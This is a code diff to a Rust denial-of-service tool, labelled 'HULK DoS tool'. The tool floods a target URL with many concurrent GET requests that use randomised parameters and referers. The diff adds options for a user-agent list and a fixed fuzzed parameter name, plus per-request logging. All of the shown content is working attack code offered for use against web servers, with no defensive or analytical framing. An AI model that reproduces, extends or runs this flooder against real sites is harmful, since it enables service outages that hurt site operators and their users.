@@ -34,14 +34,20 @@ static REFERERS: &'static [&'static str] = &[
 #[derive(Parser, Debug)]
 #[clap(author = "Hexalyse", about = "HULK DoS tool")]
 struct CliArguments {
-    #[clap(short, long, default_value = "1000")]
     /// Maximum number of concurrent connections to the target
+    #[clap(short, default_value = "1000")]
     max_connections: usize,
     /// Target URL (eg. http://example.com)
     target: String,
     /// verbose mode (display HTTP error codes)
     #[clap(short, long, takes_value = false, required = false)]
     verbose: bool,
+    /// File containing list of user agents to use
+    #[clap(short, takes_value = true, required = false)]
+    user_agents_file: Option<String>,
+    /// Name of a GET parameter to add to the request (the value will be fuzzed, instead of fuzzing both the name of a GET parameter and its value)
+    #[clap(short, takes_value = true, required = false)]
+    parameter_name: Option<String>, 
 }
 
 fn random_string(n: usize) -> String {
@@ -63,7 +69,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     println!("[*] Starting HULK attack on {}", args.target);
     let tasks = (0..args.max_connections).map(|x| {
         let target = args.target.clone();
-        tokio::spawn(async move { fetch_url(target, args.verbose, x).await })
+        let parameter_name = args.parameter_name.clone();
+        tokio::spawn(async move { fetch_url(target, args.verbose, parameter_name, x).await })
     });
     join_all(tasks).await;
 
@@ -73,6 +80,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
 async fn fetch_url(
     target: String,
     verbose: bool,
+    parameter_name: Option<String>,
     _thread: usize,
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let https = HttpsConnector::new();
@@ -80,10 +88,11 @@ async fn fetch_url(
 
     loop {
         let uri = if target.contains("?") {
-            format!("{}&{}={}", target, random_string(10), random_string(10))
+            format!("{}&{}={}", target, parameter_name.as_deref().unwrap_or(random_string(10).as_str()), random_string(10))
         } else {
-            format!("{}?{}={}", target, random_string(10), random_string(10))
+            format!("{}?{}={}", target, parameter_name.as_deref().unwrap_or(random_string(10).as_str()), random_string(10))
         };
+        println!("[*] Fetching {}", uri);
         let referer = format!(
             "{}{}",
             REFERERS[rand::thread_rng().gen_range(0..REFERERS.len())],
